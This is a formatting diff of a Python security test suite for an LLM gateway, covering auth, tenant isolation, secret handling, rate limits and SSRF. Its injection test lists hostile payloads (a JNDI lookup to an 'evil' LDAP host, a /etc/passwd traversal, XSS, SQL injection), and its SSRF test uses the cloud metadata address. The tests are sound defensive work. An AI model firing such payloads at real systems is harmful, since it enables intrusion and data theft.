@@ -42,6 +42,7 @@ def _route(admin: ControlClient, tenant, model: str | None = None) -> tuple[str,
 
 def _wait_usable(gw: GatewayClient, model: str, tries: int = 30) -> None:
     import time
+
     for _ in range(tries):
         if gw.chat(model, "warmup").status_code == 200:
             return
@@ -71,7 +72,9 @@ def test_control_auth_surface_never_500() -> None:
         for p in paths:
             for h in headers:
                 r = c.get(p, headers=h)
-                assert r.status_code == 401, f"{p} {h} → {r.status_code} (expected 401): {r.text[:200]}"
+                assert r.status_code == 401, (
+                    f"{p} {h} → {r.status_code} (expected 401): {r.text[:200]}"
+                )
 
 
 def test_gateway_auth_surface_never_500(admin: ControlClient, tenant) -> None:
@@ -84,8 +87,12 @@ def test_gateway_auth_surface_never_500(admin: ControlClient, tenant) -> None:
 
     with httpx.Client(base_url=GATEWAY_URL, timeout=10) as c:
         body = {"model": model, "messages": [{"role": "user", "content": "hi"}]}
-        for h in ({}, {"Authorization": "Bearer garbage"}, {"Authorization": "Bearer"},
-                  {"Authorization": "Bearer " + "A" * 8192}):
+        for h in (
+            {},
+            {"Authorization": "Bearer garbage"},
+            {"Authorization": "Bearer"},
+            {"Authorization": "Bearer " + "A" * 8192},
+        ):
             r = c.post("/v1/chat/completions", json=body, headers=h)
             assert r.status_code == 401, f"{h} → {r.status_code}: {r.text[:200]}"
     good.close()
@@ -103,15 +110,26 @@ def test_input_hardening_bounded_errors(admin: ControlClient, tenant) -> None:
         # malformed / mistyped / structurally-abusive input must be rejected at
         # the gateway with a bounded 4xx — never a 5xx or a panic
         malformed = {
-            "malformed-json": c.post("/v1/chat/completions", headers={**auth, "content-type": "application/json"},
-                                     content="{bad json"),
-            "wrong-content-type": c.post("/v1/chat/completions", headers={**auth, "content-type": "text/plain"},
-                                         content="not json"),
-            "deeply-nested": c.post("/v1/chat/completions", headers={**auth, "content-type": "application/json"},
-                                    content="{" * 3000 + "}" * 3000),
+            "malformed-json": c.post(
+                "/v1/chat/completions",
+                headers={**auth, "content-type": "application/json"},
+                content="{bad json",
+            ),
+            "wrong-content-type": c.post(
+                "/v1/chat/completions",
+                headers={**auth, "content-type": "text/plain"},
+                content="not json",
+            ),
+            "deeply-nested": c.post(
+                "/v1/chat/completions",
+                headers={**auth, "content-type": "application/json"},
+                content="{" * 3000 + "}" * 3000,
+            ),
         }
     for name, r in malformed.items():
-        assert 400 <= r.status_code < 500, f"{name} → {r.status_code} (expected a bounded 4xx): {r.text[:200]}"
+        assert 400 <= r.status_code < 500, (
+            f"{name} → {r.status_code} (expected a bounded 4xx): {r.text[:200]}"
+        )
     # note: a huge (well-formed) body is not asserted here — the gateway has no
     # request-size cap and forwards it upstream, so the outcome (200 or a 5xx
     # upstream error) depends on the provider, not on gateway input handling.
@@ -140,8 +158,11 @@ def test_cross_org_enumeration_is_isolated(admin: ControlClient) -> None:
         ("GET", f"/api/v1/orgs/{org_b.org_id}/providers", None),
         ("GET", f"/api/v1/orgs/{org_b.org_id}/audit-log", None),
         ("GET", f"/api/v1/projects/{org_b.project_id}/routes", None),
-        ("PUT", f"/api/v1/providers/{b_provider['id']}",
-         {"name": "hijack", "kind": "openai_compatible", "api_base": SIM_ENGINES[0]}),
+        (
+            "PUT",
+            f"/api/v1/providers/{b_provider['id']}",
+            {"name": "hijack", "kind": "openai_compatible", "api_base": SIM_ENGINES[0]},
+        ),
         ("DELETE", f"/api/v1/providers/{b_provider['id']}", None),
         ("DELETE", f"/api/v1/routes/{b_route['id']}", None),
         ("DELETE", f"/api/v1/virtual-keys/{b_key['id']}", None),
@@ -149,11 +170,15 @@ def test_cross_org_enumeration_is_isolated(admin: ControlClient) -> None:
     ]
     for method, path, body in probes:
         r = a_admin.raw(method, path, json=body)
-        assert r.status_code in (403, 404), f"leak: {method} {path} → {r.status_code}: {r.text[:200]}"
+        assert r.status_code in (403, 404), (
+            f"leak: {method} {path} → {r.status_code}: {r.text[:200]}"
+        )
 
     # and org B's resources are untouched: superadmin can still read them
     b_providers = admin.raw("GET", f"/api/v1/orgs/{org_b.org_id}/providers").json()
-    assert any(p["id"] == b_provider["id"] for p in b_providers), "cross-org mutation actually landed"
+    assert any(p["id"] == b_provider["id"] for p in b_providers), (
+        "cross-org mutation actually landed"
+    )
 
 
 # --------------------------------------------------------------------------- #
@@ -169,7 +194,9 @@ def test_provider_secret_never_leaves_tenant_apis(admin: ControlClient, tenant) 
     ``test_snapshot_channel_is_a_separate_trust_boundary``.)
     """
     secret = f"sk-live-{uuid.uuid4().hex}{uuid.uuid4().hex}"
-    created = admin.create_provider(tenant.org_id, api_base=SIM_ENGINES[0], name=_rand("prov"), api_key=secret)
+    created = admin.create_provider(
+        tenant.org_id, api_base=SIM_ENGINES[0], name=_rand("prov"), api_key=secret
+    )
     listing = admin.raw("GET", f"/api/v1/orgs/{tenant.org_id}/providers").json()
     assert secret not in str(created), "create response leaked the plaintext api_key"
     assert secret not in str(listing), "list response leaked the plaintext api_key"
@@ -184,18 +211,24 @@ def test_snapshot_channel_is_a_separate_trust_boundary(admin: ControlClient) -> 
     port, and the gateway's own internal token does.
     """
     with httpx.Client(timeout=10) as c:
-        on_public = c.get(f"{CONTROL_URL}/internal/snapshot",
-                          headers={"Authorization": f"Bearer {ADMIN_TOKEN}"})
-        assert on_public.status_code == 404, \
+        on_public = c.get(
+            f"{CONTROL_URL}/internal/snapshot", headers={"Authorization": f"Bearer {ADMIN_TOKEN}"}
+        )
+        assert on_public.status_code == 404, (
             f"snapshot still served on the operator port: {on_public.status_code}"
+        )
 
-        with_admin = c.get(f"{INTERNAL_URL}/internal/snapshot",
-                           headers={"Authorization": f"Bearer {ADMIN_TOKEN}"})
-        assert with_admin.status_code == 401, \
+        with_admin = c.get(
+            f"{INTERNAL_URL}/internal/snapshot", headers={"Authorization": f"Bearer {ADMIN_TOKEN}"}
+        )
+        assert with_admin.status_code == 401, (
             f"operator token opened the snapshot: {with_admin.status_code}"
+        )
 
-        with_internal = c.get(f"{INTERNAL_URL}/internal/snapshot",
-                              headers={"Authorization": f"Bearer {INTERNAL_TOKEN}"})
+        with_internal = c.get(
+            f"{INTERNAL_URL}/internal/snapshot",
+            headers={"Authorization": f"Bearer {INTERNAL_TOKEN}"},
+        )
         assert with_internal.status_code == 200, with_internal.text[:200]
 
     # and the channel still works end to end: the gateway polls it, so config
@@ -212,11 +245,16 @@ def test_audit_log_records_mutations_with_actor(admin: ControlClient, tenant) ->
     page = admin.raw("GET", f"/api/v1/orgs/{tenant.org_id}/audit-log").json()
     rows = page.get("items", page) if isinstance(page, dict) else page
     actions = [r.get("action", "") for r in rows]
-    assert any("provider" in a and "create" in a for a in actions), \
+    assert any("provider" in a and "create" in a for a in actions), (
         f"provider.create not audited: {actions}"
+    )
     # the audited row identifies the target and an actor
-    prov_rows = [r for r in rows if r.get("target_id") == provider["id"] or "provider" in r.get("action", "")]
-    assert prov_rows and all("action" in r for r in prov_rows), f"audit rows incomplete: {prov_rows[:2]}"
+    prov_rows = [
+        r for r in rows if r.get("target_id") == provider["id"] or "provider" in r.get("action", "")
+    ]
+    assert prov_rows and all("action" in r for r in prov_rows), (
+        f"audit rows incomplete: {prov_rows[:2]}"
+    )
 
 
 # --------------------------------------------------------------------------- #
@@ -237,7 +275,7 @@ def test_config_injection_is_parameterized(admin: ControlClient, tenant) -> None
         "${jndi:ldap://evil/x}",
         "../../etc/passwd",
         "<script>alert(1)</script>",
-        "name\" or \"1\"=\"1",
+        'name" or "1"="1',
         # postgres text cannot hold a NUL, so this used to fail inside the store
         # and surface as a 500; the API now rejects control characters (#635)
         "nul\x00byte",
@@ -249,14 +287,26 @@ def test_config_injection_is_parameterized(admin: ControlClient, tenant) -> None
     # a uniqueness conflict, not an injection — keep the two failure modes apart)
     for p in payloads:
         name = f"{p} {_rand('inj')}"
-        r = admin.raw("POST", f"/api/v1/orgs/{tenant.org_id}/providers",
-                      json={"name": name, "kind": "openai_compatible", "api_base": SIM_ENGINES[0], "api_key": "sk-fake"})
+        r = admin.raw(
+            "POST",
+            f"/api/v1/orgs/{tenant.org_id}/providers",
+            json={
+                "name": name,
+                "kind": "openai_compatible",
+                "api_base": SIM_ENGINES[0],
+                "api_key": "sk-fake",
+            },
+        )
         # accepted-as-data (2xx) or rejected-by-validation (4xx); never a 500
-        assert r.status_code < 500, f"injection payload {p!r} caused {r.status_code}: {r.text[:200]}"
+        assert r.status_code < 500, (
+            f"injection payload {p!r} caused {r.status_code}: {r.text[:200]}"
+        )
 
     # the store is intact: a normal create + list still works, and the snapshot
     # still serves (no dropped tables, no poisoned config, injection inert)
-    ok = admin.create_provider(tenant.org_id, api_base=SIM_ENGINES[0], name=_rand("after-injection"))
+    ok = admin.create_provider(
+        tenant.org_id, api_base=SIM_ENGINES[0], name=_rand("after-injection")
+    )
     assert ok.get("id"), "store broke after injection payloads"
     assert "config" in admin.snapshot(), "snapshot broke after injection payloads"
 
@@ -268,6 +318,7 @@ def test_rate_limit_holds_under_concurrency(admin: ControlClient, tenant) -> Non
     """a per-key RPM cap is enforced atomically: firing many requests in
     parallel does not let the overage slip through (redis-backed counter)."""
     import time
+
     model, _ = _route(admin, tenant)
     key = admin.create_virtual_key(tenant.project_id, models=[model])
     warm = GatewayClient(GATEWAY_URL, virtual_key=key["key"])
@@ -275,8 +326,12 @@ def test_rate_limit_holds_under_concurrency(admin: ControlClient, tenant) -> Non
     warm.close()
 
     rpm = 5
-    admin.raw("POST", "/api/v1/rate-limits",
-              json={"scope_type": "virtual_key", "scope_id": key["id"], "rpm": rpm}, expect=(200, 201))
+    admin.raw(
+        "POST",
+        "/api/v1/rate-limits",
+        json={"scope_type": "virtual_key", "scope_id": key["id"], "rpm": rpm},
+        expect=(200, 201),
+    )
     # let the cap reach the gateway snapshot before the concurrent burst
     time.sleep(4)
 
@@ -310,9 +365,16 @@ def test_ssrf_link_local_api_base_is_rejected(admin: ControlClient, tenant) -> N
 
     (only the config write is exercised; no request is sent to the metadata
     address.)"""
-    r = admin.raw("POST", f"/api/v1/orgs/{tenant.org_id}/providers",
-                  json={"name": _rand("ssrf"), "kind": "openai_compatible",
-                        "api_base": "http://169.254.169.254/latest/meta-data", "api_key": "sk-fake"})
+    r = admin.raw(
+        "POST",
+        f"/api/v1/orgs/{tenant.org_id}/providers",
+        json={
+            "name": _rand("ssrf"),
+            "kind": "openai_compatible",
+            "api_base": "http://169.254.169.254/latest/meta-data",
+            "api_key": "sk-fake",
+        },
+    )
     assert r.status_code >= 400, "link-local api_base must be rejected"
     assert "link-local" in r.text
 
@@ -321,7 +383,14 @@ def test_ssrf_private_upstreams_stay_allowed(admin: ControlClient, tenant) -> No
     """The policy must not break rolter's core use case: self-hosted and
     air-gapped upstreams legitimately live on private/loopback addresses, so
     only link-local is denied by default (#634)."""
-    r = admin.raw("POST", f"/api/v1/orgs/{tenant.org_id}/providers",
-                  json={"name": _rand("onprem"), "kind": "openai_compatible",
-                        "api_base": "http://10.0.0.5:8000/v1", "api_key": "sk-fake"})
+    r = admin.raw(
+        "POST",
+        f"/api/v1/orgs/{tenant.org_id}/providers",
+        json={
+            "name": _rand("onprem"),
+            "kind": "openai_compatible",
+            "api_base": "http://10.0.0.5:8000/v1",
+            "api_key": "sk-fake",
+        },
+    )
     assert r.status_code < 300, f"private api_base must stay allowed: {r.text}"
